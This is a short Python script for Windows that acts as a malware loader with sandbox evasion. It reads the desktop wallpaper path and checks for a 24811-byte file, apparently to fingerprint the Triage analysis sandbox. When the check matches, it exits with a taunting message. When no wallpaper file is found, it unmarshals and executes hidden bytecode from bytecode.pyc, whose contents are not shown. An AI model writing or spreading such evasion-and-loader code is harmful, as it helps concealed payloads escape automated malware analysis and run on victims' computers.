import ctypes
import os
import marshal
import types

def load_scawwy_bytecode():
    with open("bytecode.pyc", 'rb') as f:
        bytecode = f.read()

    loaded_bytecode = marshal.loads(bytecode)

    loaded_function = types.FunctionType(loaded_bytecode, globals(), "function")

    loaded_function()

def main():
    SPI_GETDESKWALLPAPER = 0x0073
    buffer_size = 260
    buffer = ctypes.create_unicode_buffer(buffer_size)
    
    ctypes.windll.user32.SystemParametersInfoW(SPI_GETDESKWALLPAPER, buffer_size, buffer, 0)
    wallpaper_path = buffer.value
    
    if os.path.isfile(wallpaper_path):
        file_size = os.path.getsize(wallpaper_path)
        if file_size == 24811:
            print(f"triage my nutsack")
            exit(69420)
    else:
        load_scawwy_bytecode()


main()
